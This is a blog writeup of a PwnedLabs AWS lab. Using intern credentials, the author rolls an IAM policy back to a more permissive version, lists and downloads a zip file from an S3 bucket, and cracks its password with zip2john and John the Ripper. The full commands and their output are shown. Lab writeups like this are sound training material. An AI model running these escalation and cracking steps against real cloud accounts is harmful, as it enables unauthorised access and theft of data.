---
title: Escalate Privileges by IAM Policy Rollback
layout: post
date: 2025-06-27
categories: [Writeups, PwnedLabs]
tags: [Cloud, AWS, John the Ripper]
author: bailee
toc: true
description: Using a file containing AWS credentials, navigate and access sensitive data and resources.
---
Lab Platform: 
: [PwnedLabs](https://pwnedlabs.io/labs/escalate-privileges-by-iam-policy-rollback)

---

## Tools, Commands, & Resources

### Tools Used

- zip2john
- John the Ripper

### Commands

- `aws iam get-policy-version --policy-arn <policy-arn> --version-id <v#>`
    - Get the details of a specific version of a policy by it’s ARN and the version ID (v#). Only works with custom-made policies, not AWS-managed ones.

- `aws iam set-default-policy-version --policy-arn <policy-arn> --version-id <v#>`
    - Set the default policy version being used for a policy by its ARN and version ID.

### References

- <https://www.esecurityplanet.com/products/john-the-ripper/>
- <https://linuxcommandlibrary.com/man/zip2john>
- <https://github.com/openwall/john>

---

## Lab Walkthrough

### Enumeration

Using the provided AWS credentials, I configured my profile. First, let’s see what my user is and do some initial enumeration.

```
┌──(kali㉿kali)-[~]
└─$ aws sts get-caller-identity                                               
{
    "UserId": "AIDAZWFVYTTLSTOYD4ORI",
    "Account": "666101128407",
    "Arn": "arn:aws:iam::666101128407:user/intern01"
   }
┌──(kali㉿kali)-[~]
└─$ aws iam list-attached-user-policies --user-name intern01
{
    "AttachedPolicies": [
        {
            "PolicyName": "intern_policy",
            "PolicyArn": "arn:aws:iam::666101128407:policy/intern_policy"
        }
    ]
}
┌──(kali㉿kali)-[~]
└─$ aws iam list-policy-versions --policy-arn arn:aws:iam::666101128407:policy/intern_policy
{
    "Versions": [
        {
            "VersionId": "v2",
            "IsDefaultVersion": true,
            "CreateDate": "2025-06-14T03:40:49+00:00"
        },
        {
            "VersionId": "v1",
            "IsDefaultVersion": false,
            "CreateDate": "2025-06-14T03:40:48+00:00"
        }
    ]
}
```

So the account we are using, ‘intern01’, has a policy called ‘intern_policy’ attatched to the user. We can view all of the policy versions by using the command `aws iam list-policy-versions --policy-arn <policy-arn>`. There are two versions - v1 and v2. How are they different? 

```
┌──(kali㉿kali)-[~]
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::666101128407:policy/intern_policy --version-id v2 
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "internpolicy",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:ListPolicyVersions",
                        "iam:GetUserPolicy",
                        "iam:ListAttachedUserPolicies",
                        "iam:SetDefaultPolicyVersion"
                    ],
                    "Resource": [
                        "arn:aws:iam::*:user/intern01",
                        "arn:aws:iam::*:policy/intern_policy"
                    ]
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2025-06-14T03:40:49+00:00"
    }
}
┌──(kali㉿kali)-[~]
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::666101128407:policy/intern_policy --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "ec2:DescribeInstances",
                        "s3:ListAllMyBuckets",
                        "s3:GetObject",
                        "s3:ListBucket"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": false,
        "CreateDate": "2025-06-14T03:40:48+00:00"
    }
}
```

### Privilege Escalation

It looks like v2 is a lot more restrictive than v1. V1 allows describing ec2 instances, and listing and getting objects from S3 anywhere in the account. v1, wisely, only allows for some get & list policies on our own account and policy. It would sure be nice if we could go back to that old policy… Oh wait, we can do that with the command `aws iam set-default-policy-version --policy-arn <policy-arn> --version-id <version-id>` !

```
┌──(kali㉿kali)-[~]
└─$ aws iam set-default-policy-version --policy-arn arn:aws:iam::666101128407:policy/intern_policy --version-id v1
                                                                                                                               
┌──(kali㉿kali)-[~]
└─$ aws s3 ls                                                                                                     
2025-06-13 23:40:50 huge-logistics-data-1fc2a16b89a3
```

It worked! After changing the policy version, we can list S3 information now! What all is in here anyway? 

```
┌──(kali㉿kali)-[~]
└─$ aws s3 ls huge-logistics-data-1fc2a16b89a3
2025-06-13 23:40:51       4352 amex-export.zip
```

Amex, like American Express? 

```
┌──(kali㉿kali)-[~]
└─$ aws s3 cp s3://huge-logistics-data-1fc2a16b89a3/amex-export.zip .
download: s3://huge-logistics-data-1fc2a16b89a3/amex-export.zip to ./amex-export.zip
                                                                                                                               
┌──(kali㉿kali)-[~]
└─$ unzip amex-export.zip                         
Archive:  amex-export.zip
[amex-export.zip] amex-export.json password: 
   skipping: amex-export.json        incorrect password
   skipping: flag.txt                incorrect password
```

### Credential Access

Looks like I need a password… well, maybe the passwords game here isn’t that strong. Time to try John the Ripper. 

```
┌──(kali㉿kali)-[~]
└─$ zip2john ../../amex-export.zip > amex-export.zip.hash 
! ../../amex-export.zip : No such file or directory

┌──(kali㉿kali)-[~]
└─$ john amex-export.zip.hash --wordlist=rockyou.txt     
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1logistics       (amex-export.zip)     
1g 0:00:00:01 DONE (2025-06-14 00:11) 0.6622g/s 8615Kp/s 8615Kc/s 8615KC/s 1luvtyson..1josh=fit
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                               
┌──(kali㉿kali)-[~]
└─$ unzip amex-export.zip 
Archive:  amex-export.zip
[amex-export.zip] amex-export.json password: 
  inflating: amex-export.json        
 extracting: flag.txt                                         
```

And there’s the flag!